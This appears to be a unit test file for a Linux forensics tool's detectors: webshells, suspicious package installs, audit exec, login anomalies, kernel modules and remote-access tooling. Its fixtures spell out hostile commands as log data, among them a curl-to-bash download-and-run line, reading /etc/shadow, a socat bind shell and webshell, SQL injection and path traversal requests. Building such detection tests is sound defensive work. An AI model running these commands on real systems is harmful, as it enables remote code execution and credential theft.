"""Unit tests for step-7b detectors: webshell, package_install,
audit_exec, login_anomalies, kernel_module."""

from __future__ import annotations

from datetime import UTC, datetime, timedelta

from conftest import make_mini_evidence

from linuxdfir.detectors import (
    audit_exec,
    kernel_module,
    login_anomalies,
    package_install,
    remote_access,
    webshell,
)
from linuxdfir.ingest import Evidence
from linuxdfir.schema import Event, Severity


def _event(**kw) -> Event:
    defaults = dict(
        timestamp_utc=None,
        host="test",
        user=None,
        source_artifact="test",
        event_type="test",
        message="",
        evidence_path="/test",
        line_or_offset=1,
    )
    defaults.update(kw)
    return Event(**defaults)


def _web(method, uri, status, ip, ua="Mozilla/5.0"):
    return _event(
        event_type="web_request",
        evidence_path="/var/log/nginx/access.log",
        message=f'web {method} {uri} -> {status} from {ip} ua="{ua}"',
    )


# --------------------------------------------------------------- webshell


class TestWebshell:
    def test_webshell_hit_high(self):
        events = [
            _web("GET", "/wp-content/uploads/shell.php?cmd=id", 200, "203.0.113.9"),
            _web("POST", "/wp-content/uploads/shell.php", 200, "203.0.113.9"),
        ]
        findings = webshell.detect(events)
        assert len(findings) == 1
        assert findings[0].severity == Severity.HIGH
        assert "T1505.003" in findings[0].mitre_ids

    def test_single_probe_low(self):
        findings = webshell.detect([_web("GET", "/?x=' OR 1=1--", 404, "203.0.113.9")])
        assert len(findings) == 1
        assert findings[0].severity == Severity.LOW

    def test_repeated_probing_medium(self):
        events = [_web("GET", "/?x=../../etc/passwd", 404, "203.0.113.9") for _ in range(3)]
        findings = webshell.detect(events)
        assert len(findings) == 1
        assert findings[0].severity == Severity.MEDIUM

    def test_scanner_ua_medium(self):
        findings = webshell.detect([_web("GET", "/index.html", 200, "203.0.113.9", ua="sqlmap/1.7")])
        assert findings and findings[0].severity == Severity.MEDIUM

    def test_post_new_script_medium(self):
        findings = webshell.detect([_web("POST", "/uploads/new.php", 200, "203.0.113.9")])
        mediums = [f for f in findings if f.severity == Severity.MEDIUM]
        assert mediums

    def test_benign_clean(self):
        events = [
            _web("GET", "/index.html", 200, "10.0.0.7", ua="curl/8.0"),
            _web("GET", "/about.html", 200, "10.0.0.7", ua="Mozilla/5.0"),
        ]
        assert webshell.detect(events) == []


# ---------------------------------------------------------- package_install


class TestPackageInstall:
    def test_netcat_medium(self):
        e = _event(
            event_type="package_install",
            evidence_path="/var/log/dpkg.log",
            message="package install netcat-traditional:amd64 1.10-41.1",
        )
        findings = package_install.detect([e])
        assert findings and findings[0].severity == Severity.MEDIUM
        assert "T1588.002" in findings[0].mitre_ids

    def test_libc6_clean(self):
        e = _event(
            event_type="package_install",
            evidence_path="/var/log/dpkg.log",
            message="package install libc6:amd64 2.36-9",
        )
        assert package_install.detect([e]) == []

    def test_remove_silent(self):
        e = _event(
            event_type="package_remove",
            evidence_path="/var/log/dpkg.log",
            message="package remove nmap:amd64 7.93",
        )
        assert package_install.detect([e]) == []

    def test_explicit_apt_request_medium(self):
        e = _event(
            event_type="package_install",
            evidence_path="/var/log/apt/history.log",
            message="package install netcat-traditional:amd64 1.10 via apt install netcat-traditional",
        )
        findings = package_install.detect([e])
        assert findings and findings[0].severity == Severity.MEDIUM
        assert "explicitly requested" in findings[0].description

    def test_automatic_dependency_low(self):
        e = _event(
            event_type="package_install",
            evidence_path="/var/log/apt/history.log",
            message="package install netcat-traditional:amd64 1.10 via apt install my-meta-package",
        )
        findings = package_install.detect([e])
        assert len(findings) == 1
        assert findings[0].severity == Severity.LOW
        assert "automatic dependency" in findings[0].description

    def test_allowlisted_image_package_info(self):
        e = _event(
            event_type="package_install",
            evidence_path="/var/log/dpkg.log",
            message="package install netcat-openbsd:amd64 1.219-1",
        )
        findings = package_install.detect([e])
        assert len(findings) == 1
        assert findings[0].severity == Severity.INFO
        assert "default image" in findings[0].description

    def test_explicit_beats_allowlist(self):
        e = _event(
            event_type="package_install",
            evidence_path="/var/log/apt/history.log",
            message="package install netcat-openbsd:amd64 1.219-1 via apt install netcat-openbsd",
        )
        findings = package_install.detect([e])
        assert findings and findings[0].severity == Severity.MEDIUM

    def test_bulk_batch_info(self, tmp_path):
        from linuxdfir.parsers import package_logs

        lines = ["2026-01-02 03:20:11 install netcat-openbsd:amd64 1.219-1 1.219-1"]
        lines += [f"2026-01-02 03:2{i // 60}:{i % 60:02d} install base-pkg-{i}:amd64 1.0 1.0" for i in range(54)]
        root = make_mini_evidence(tmp_path / "mini", files={"/var/log/dpkg.log": "\n".join(lines).encode()})
        with Evidence.open(root) as evidence:
            events = list(package_logs.parse_member(evidence, "evidence/var/log/dpkg.log"))
        assert len(events) == 55
        findings = package_install.detect(events)
        assert findings, "bulk batch must still be visible as INFO"
        assert all(f.severity == Severity.INFO for f in findings)
        assert not [f for f in findings if f.severity in (Severity.MEDIUM, Severity.HIGH)]
        assert "bulk batch of 55" in findings[0].description

    def test_custom_config_threshold(self, tmp_path):
        from linuxdfir.config import load_config

        custom = tmp_path / "custom.toml"
        custom.write_text("[bulk_batch]\nthreshold = 5\n", encoding="utf-8")
        base = datetime(2026, 1, 2, 1, 20, 11, tzinfo=UTC)
        events = [
            _event(
                event_type="package_install",
                evidence_path="/var/log/dpkg.log",
                timestamp_utc=base + timedelta(seconds=i * 30),
                message=f"package install bulk-pkg-{i}:amd64 1.0",
            )
            for i in range(6)
        ]
        events.append(
            _event(
                event_type="package_install",
                evidence_path="/var/log/dpkg.log",
                timestamp_utc=base,
                message="package install nmap:amd64 7.93",
            )
        )
        assert package_install.detect(events)[0].severity == Severity.MEDIUM
        tuned = package_install.detect(events, config=load_config(custom))
        assert tuned and tuned[0].severity == Severity.INFO

    def test_custom_tool_list(self, tmp_path):
        from linuxdfir.config import load_config

        custom = tmp_path / "custom.toml"
        custom.write_text('[package_tools]\ntools = ["frobnicate"]\n', encoding="utf-8")
        cfg = load_config(custom)
        e = _event(
            event_type="package_install",
            evidence_path="/var/log/dpkg.log",
            message="package install frobnicate:amd64 1.0",
        )
        assert package_install.detect([e], config=cfg)
        assert package_install.detect([e]) == []


# -------------------------------------------------------------- audit_exec


class TestAuditExec:
    def test_curl_pipe_sh_high(self):
        e = _event(
            event_type="audit_exec",
            evidence_path="/var/log/audit/audit.log",
            message="audit exec pid=4152 auid=0: bash -c curl http://e.com/x | bash",
        )
        findings = audit_exec.detect([e])
        assert findings and findings[0].severity == Severity.HIGH
        assert "T1059" in findings[0].mitre_ids

    def test_shadow_access_credential_mitre(self):
        e = _event(
            event_type="audit_exec",
            evidence_path="/var/log/audit/audit.log",
            message="audit exec pid=4152 auid=0: cat /etc/shadow",
        )
        findings = audit_exec.detect([e])
        assert findings and "T1003.008" in findings[0].mitre_ids

    def test_benign_silent(self):
        e = _event(
            event_type="audit_exec",
            evidence_path="/var/log/audit/audit.log",
            message="audit exec pid=100 auid=0: /usr/sbin/cron -f",
        )
        assert audit_exec.detect([e]) == []

    def test_priv_transition_medium(self):
        e = _event(
            event_type="audit_event",
            evidence_path="/var/log/audit/audit.log",
            message="audit event 70 [SYSCALL]: exe=/bin/su auid=1000 uid=0 success=yes",
        )
        findings = audit_exec.detect([e])
        assert findings and findings[0].severity == Severity.MEDIUM

    def test_root_auid_silent(self):
        e = _event(
            event_type="audit_event",
            evidence_path="/var/log/audit/audit.log",
            message="audit event 45 [SYSCALL]: exe=/usr/bin/bash auid=0 uid=0 success=yes",
        )
        assert audit_exec.detect([e]) == []


# ---------------------------------------------------------- login_anomalies


def _login(user, ip, hour, path="/var/log/wtmp"):
    return _event(
        event_type="wtmp_login",
        evidence_path=path,
        message=f"login {user} from {ip} on pts/0 at 2026-01-02T{hour:02d}:12:44+02:00",
    )


def _failure(user, ip, stamp):
    return _event(
        event_type="btmp_failure",
        evidence_path="/var/log/btmp",
        timestamp_utc=stamp,
        message=f"failed login {user} from {ip} on ssh at 2026-01-02T03:10:07+02:00",
    )


class TestLoginAnomalies:
    def test_correlated_high(self):
        stamp = datetime(2026, 1, 2, 1, 10, 7, tzinfo=UTC)
        events = [_login("root", "203.0.113.9", 3), _failure("root", "203.0.113.9", stamp)]
        findings = login_anomalies.detect(events)
        highs = [f for f in findings if f.severity == Severity.HIGH]
        assert len(highs) == 1
        assert "T1078" in highs[0].mitre_ids

    def test_night_login_low(self):
        findings = login_anomalies.detect([_login("admin", "10.0.0.7", 3)])
        assert len(findings) == 1
        assert findings[0].severity == Severity.LOW

    def test_day_login_clean(self):
        assert login_anomalies.detect([_login("admin", "10.0.0.7", 9)]) == []

    def test_btmp_spike_medium(self):
        base = datetime(2026, 1, 2, 1, 10, 7, tzinfo=UTC)
        events = [
            _failure("root", "203.0.113.9", base.replace(second=(base.second + i * 20) % 60))
            for i in range(20)
        ]
        findings = login_anomalies.detect(events)
        assert any(f.severity == Severity.MEDIUM and "spike" in f.title for f in findings)

    def test_root_direct_low(self):
        findings = login_anomalies.detect([_login("root", "10.0.0.7", 9)])
        assert len(findings) == 1
        assert findings[0].severity == Severity.LOW

    def test_root_correlated_suppresses_direct(self):
        stamp = datetime(2026, 1, 2, 1, 10, 7, tzinfo=UTC)
        events = [_login("root", "203.0.113.9", 9), _failure("root", "203.0.113.9", stamp)]
        findings = login_anomalies.detect(events)
        assert not [f for f in findings if "Direct root login" in f.title]


# ------------------------------------------------------------ kernel_module


class TestKernelModule:
    def test_out_of_tree_medium(self):
        e = _event(
            event_type="kernel_module",
            evidence_path="/var/log/kern.log",
            message="kernel module hid_x: loading out-of-tree module taints kernel.",
        )
        findings = kernel_module.detect([e])
        assert findings and findings[0].severity == Severity.MEDIUM
        assert "T1547.006" in findings[0].mitre_ids

    def test_plain_load_silent(self):
        e = _event(
            event_type="kernel_module",
            evidence_path="/var/log/kern.log",
            message="kernel module tls: loaded during boot",
        )
        assert kernel_module.detect([e]) == []


# ----------------------------------------------------------- remote_access


class TestRemoteAccess:
    def test_frp_unit_low(self):
        e = _event(
            event_type="systemd_exec",
            user="root",
            evidence_path="/etc/systemd/system/frpc.service",
            message="ExecStart=/usr/bin/frpc -c /etc/frpc.ini (user=root)",
        )
        findings = remote_access.detect([e])
        assert len(findings) == 1
        assert findings[0].severity == Severity.LOW
        assert "T1572" in findings[0].mitre_ids
        assert "often legitimate" in findings[0].description

    def test_ngrok_process_low(self):
        e = _event(
            event_type="process",
            user="alice",
            evidence_path="live/ps_auxf.txt",
            message="process alice pid=4444: ./ngrok http 80",
        )
        findings = remote_access.detect([e])
        assert findings and findings[0].rule == "remote_access_tooling"

    def test_chisel_cron_low(self):
        e = _event(
            event_type="cron_job",
            user="root",
            evidence_path="/etc/cron.d/tun",
            message="cron [* * * * *] root: /usr/local/bin/chisel client example.com:443 R:8080:localhost:80",
        )
        findings = remote_access.detect([e])
        assert findings and findings[0].severity == Severity.LOW

    def test_socat_tunnel_low(self):
        e = _event(
            event_type="process",
            user="root",
            evidence_path="live/ps_auxf.txt",
            message="process root pid=1: socat TCP-LISTEN:4444,fork EXEC:/bin/bash",
        )
        findings = remote_access.detect([e])
        assert findings and findings[0].severity == Severity.LOW

    def test_socat_plain_silent(self):
        e = _event(
            event_type="process",
            user="root",
            evidence_path="live/ps_auxf.txt",
            message="process root pid=1: socat -V",
        )
        assert remote_access.detect([e]) == []

    def test_tailscale_info(self):
        e = _event(
            event_type="systemd_exec",
            user="root",
            evidence_path="/usr/lib/systemd/system/tailscaled.service",
            message="ExecStart=/usr/sbin/tailscaled (user=root)",
        )
        findings = remote_access.detect([e])
        assert findings and findings[0].severity == Severity.INFO

    def test_benign_silent(self):
        events = [
            _event(
                event_type="process",
                user="root",
                evidence_path="live/ps_auxf.txt",
                message="process root pid=1: /sbin/init",
            ),
            _event(
                event_type="cron_job",
                user="root",
                evidence_path="/etc/crontab",
                message="cron [0 3 * * *] root: /usr/local/bin/backup.sh",
            ),
        ]
        assert remote_access.detect(events) == []

    def test_generated_hosts_have_none(self, generated, tmp_path):
        import json

        from linuxdfir import cli

        for profile in ("infected", "clean"):
            archive = generated["results"][profile]["archive"]
            out = tmp_path / profile
            assert cli.main(["parse", str(archive), "-o", str(out)]) == 0
            fout = tmp_path / f"{profile}-findings"
            assert cli.main(["detect", str(out), "-o", str(fout)]) == 0
            findings = json.loads((fout / "findings.json").read_text(encoding="utf-8"))
            assert [f for f in findings if f["rule"] == "remote_access_tooling"] == []
